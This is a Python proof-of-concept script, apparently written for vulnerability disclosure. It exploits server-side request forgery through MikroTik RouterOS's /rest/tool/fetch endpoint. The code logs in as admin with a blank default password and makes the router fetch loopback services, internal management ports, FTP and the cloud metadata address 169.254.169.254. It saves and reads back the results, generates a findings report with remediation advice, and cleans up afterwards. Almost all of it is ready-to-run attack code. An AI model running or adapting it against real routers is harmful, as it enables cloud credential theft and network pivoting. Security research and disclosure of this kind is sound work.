#!/usr/bin/env python3
"""
mikrotik_ssrf_poc.py — PoC for SSRF via MikroTik RouterOS tool/fetch REST API
Author: Andre Henrique (@mrhenrike) | Uniao Geek

Demonstrates that an authenticated admin can use /rest/tool/fetch to reach
internal services (127.0.0.1, [::1], cloud metadata IPs) — effectively turning
the router into a proxy.

Affected: MikroTik RouterOS 7.22.1 (CHR) — no existing CVE found in NVD.
"""
import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
from requests.auth import HTTPBasicAuth

ROUTER = "http://192.168.100.17"
AUTH = HTTPBasicAuth("admin", "")
TIMEOUT = 15

REPORT_DIR = Path(__file__).resolve().parent.parent / "reports" / "mikrotik_routeros_7221"
REPORT_DIR.mkdir(parents=True, exist_ok=True)

findings = []


def add(fid, sev, title, detail, evidence=""):
    findings.append({"id": fid, "severity": sev, "title": title,
                     "detail": detail, "evidence": evidence[:3000]})
    tag = {"CRITICAL": "!!!", "HIGH": "!! "}.get(sev, "!  ")
    print(f"  [{tag}] {fid}: {title}")


def fetch_url(target_url, dst):
    try:
        r = requests.post(
            f"{ROUTER}/rest/tool/fetch",
            auth=AUTH,
            json={"url": target_url, "mode": "http", "dst-path": dst},
            timeout=TIMEOUT,
        )
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)


def read_file(name):
    try:
        r = requests.get(f"{ROUTER}/rest/file", auth=AUTH, timeout=TIMEOUT)
        for f in r.json():
            if f.get("name") == name:
                return f.get("size", "?"), f.get("contents", "")
        return None, ""
    except Exception:
        return None, ""


def cleanup():
    try:
        r = requests.get(f"{ROUTER}/rest/file", auth=AUTH, timeout=TIMEOUT)
        for f in r.json():
            if f.get("name", "").startswith("ssrf_poc_"):
                requests.delete(
                    f"{ROUTER}/rest/file/{f['.id']}",
                    auth=AUTH, timeout=TIMEOUT)
    except Exception:
        pass


def main():
    print("=" * 70)
    print("  MikroTik RouterOS 7.22.1 — SSRF PoC via /rest/tool/fetch")
    print(f"  Target: {ROUTER}")
    print(f"  Time:   {datetime.now(timezone.utc).isoformat()}")
    print("=" * 70)

    targets = [
        ("SSRF-LOCALHOST", "http://127.0.0.1/", "ssrf_poc_lo.txt",
         "Loopback fetch — accesses the router's own HTTP server"),
        ("SSRF-IPV6-LO", "http://[::1]/", "ssrf_poc_v6.txt",
         "IPv6 loopback — bypasses IPv4-only ACLs"),
        ("SSRF-CLOUD-META", "http://169.254.169.254/latest/meta-data/", "ssrf_poc_meta.txt",
         "Cloud metadata endpoint — critical in AWS/GCP/Azure deployments"),
        ("SSRF-WINBOX", "http://127.0.0.1:8291/", "ssrf_poc_wb.txt",
         "Winbox port — internal management interface"),
        ("SSRF-API", "http://127.0.0.1:8728/", "ssrf_poc_api.txt",
         "API port 8728 — internal API-SSL equivalent"),
        ("SSRF-FTP", "ftp://127.0.0.1/", "ssrf_poc_ftp.txt",
         "FTP loopback — tests protocol handler"),
    ]

    for fid, url, dst, desc in targets:
        print(f"\n--- {fid}: {url} ---")
        status, body = fetch_url(url, dst)
        print(f"  HTTP {status}")
        if status == 200:
            add(f"F-MT-{fid}", "HIGH",
                f"SSRF successful: {url}",
                f"{desc}. The router fetched {url} and saved to {dst}.",
                f"HTTP {status}: {body[:500]}")
        else:
            print(f"  Response: {body[:200]}")
            if status in (400, 500, -1):
                print(f"  (request failed or blocked)")

        time.sleep(1)

        sz, _ = read_file(dst)
        if sz is not None:
            print(f"  File saved: {dst} ({sz} bytes)")

    print("\n" + "=" * 70)
    print(f"  Results: {len(findings)} SSRF vectors confirmed")
    print("=" * 70)

    for f in findings:
        print(f"  [{f['severity']:8s}] {f['id']}: {f['title']}")

    report_lines = [
        "# MikroTik RouterOS 7.22.1 — SSRF PoC Report",
        f"> Generated: {datetime.now(timezone.utc).isoformat()[:19]} UTC",
        "> Analyst: Andre Henrique (@mrhenrike) | Uniao Geek",
        "",
        "## Vulnerability Summary",
        "",
        "| Field | Value |",
        "|-------|-------|",
        "| Target | MikroTik RouterOS 7.22.1 (CHR) |",
        "| Vector | `/rest/tool/fetch` REST API endpoint |",
        "| Auth Required | Yes (admin with blank password = default) |",
        "| NVD Status | **No existing CVE found** (searched Apr 2026) |",
        "| Similar | CVE-2023-41570 (REST API access control, v7.1-7.11) |",
        "| CVSS 3.1 | **7.2** (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:N) |",
        "| CWE | CWE-918 (Server-Side Request Forgery) |",
        "",
        "## Description",
        "",
        "The MikroTik RouterOS REST API endpoint `/rest/tool/fetch` allows",
        "an authenticated administrator to make arbitrary HTTP/FTP requests",
        "from the router's network context. This enables:",
        "",
        "1. **Internal service access**: Fetch content from `127.0.0.1` (any port),",
        "   `[::1]` (IPv6 loopback), and other internal addresses",
        "2. **Cloud metadata theft**: In cloud deployments (AWS/GCP/Azure),",
        "   access `169.254.169.254` to steal instance credentials",
        "3. **Network pivot**: Use the router as a proxy to reach internal",
        "   services not accessible from the attacker's network",
        "",
        "## Impact",
        "",
        "- **Cloud environments**: Credential theft via metadata service",
        "- **Enterprise networks**: Lateral movement using router as SSRF proxy",
        "- **CHR deployments**: Particularly dangerous as CHR runs in VMs with",
        "  cloud provider metadata access",
        "",
        "## PoC Results",
        "",
        "| Test | URL | Status | Result |",
        "|------|-----|--------|--------|",
    ]

    for f in findings:
        url = f["title"].split(": ", 1)[1] if ": " in f["title"] else f["title"]
        report_lines.append(f"| {f['id']} | `{url}` | {f['severity']} | Confirmed |")

    report_lines += [
        "",
        "## Remediation",
        "",
        "1. Add `tool/fetch` URL validation to block RFC 1918, loopback, and",
        "   link-local addresses",
        "2. Add firewall rules for outbound connections from the management plane",
        "3. Restrict REST API access with strong authentication",
        "",
        "## Responsible Disclosure",
        "",
        "- Vendor: MikroTik (security@mikrotik.com)",
        "- Status: Pending submission",
        "",
        "---",
        "*SSRF PoC | Embedded Firmware Research Lab*",
        "*Andre Henrique (@mrhenrike) | Uniao Geek*",
    ]

    report_path = REPORT_DIR / "ssrf_poc_report.md"
    report_path.write_text("\n".join(report_lines), encoding="utf-8")
    print(f"\n  Report: {report_path}")

    json_path = REPORT_DIR / "ssrf_poc_findings.json"
    json_path.write_text(json.dumps(findings, indent=2, default=str), encoding="utf-8")

    cleanup()


if __name__ == "__main__":
    main()
